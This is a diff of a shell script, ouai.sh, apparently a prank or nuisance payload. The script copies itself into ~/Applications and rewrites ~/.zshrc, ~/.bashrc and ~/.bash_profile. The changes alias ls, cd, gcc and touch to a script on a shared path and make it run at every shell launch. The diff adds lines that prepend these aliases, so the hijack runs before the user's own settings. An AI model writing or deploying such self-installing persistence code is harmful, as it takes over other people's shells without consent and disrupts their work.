@@ -1,24 +1,52 @@
 echo "$(cat $0)" > ~/Applications/ouai.sh
 chmod a+rx ~/Applications/ouai.sh
+
+echo "$(cat ~/.zshrc)" > ~/.zshrc_save
+echo "alias ls=\"/sgoinfre/goinfre/Misc/ouai.sh\"" > ~/.zshrc
+echo "alias cd=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.zshrc
+echo "alias gcc=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.zshrc
+echo "alias touch=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.zshrc
+echo "~/Applications/ouai.sh" >> ~/.zshrc
+echo "$(cat ~/.zshrc_save)" >> ~/.zshrc
 echo "alias ls=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.zshrc
 echo "alias cd=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.zshrc
 echo "alias gcc=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.zshrc
+echo "alias touch=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.zshrc
 echo "~/Applications/ouai.sh" >> ~/.zshrc
+rm ~/.zshrc_save
 source ~/.zshrc
 
 if [ -f ~/.bashrc ]; then
+	echo "$(cat ~/.bashrc)" > ~/.bashrc_save
+	echo "alias ls=\"/sgoinfre/goinfre/Misc/ouai.sh\"" > ~/.bashrc
+	echo "alias cd=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.bashrc
+	echo "alias gcc=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.bashrc
+	echo "alias touch=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.bashrc
+	echo "~/Applications/ouai.sh" >> ~/.bashrc
+	echo "$(cat ~/.bashrc_save)" >> ~/.bashrc
 	echo "alias ls=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.bashrc
 	echo "alias cd=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.bashrc
 	echo "alias gcc=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.bashrc
+	echo "alias touch=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.bashrc
 	echo "~/Applications/ouai.sh" >> ~/.bashrc
+	rm ~/.bashrc_save
 	source ~/.bashrc
 fi
 
 if [ -f ~/.bash_profile ]; then
+	echo "$(cat ~/.bash_profile)" > ~/.bash_profile_save
+	echo "alias ls=\"/sgoinfre/goinfre/Misc/ouai.sh\"" > ~/.bash_profile
+	echo "alias cd=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.bash_profile
+	echo "alias gcc=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.bash_profile
+	echo "alias touch=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.bash_profile
+	echo "~/Applications/ouai.sh" >> ~/.bash_profile
+	echo "$(cat ~/.bash_profile_save)" >> ~/.bash_profile
 	echo "alias ls=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.bash_profile
 	echo "alias cd=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.bash_profile
 	echo "alias gcc=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.bash_profile
+	echo "alias touch=\"/sgoinfre/goinfre/Misc/ouai.sh\"" >> ~/.bash_profile
 	echo "~/Applications/ouai.sh" >> ~/.bash_profile
+	rm ~/.bash_profile_save
 	source ~/.bash_profile
 fi
 
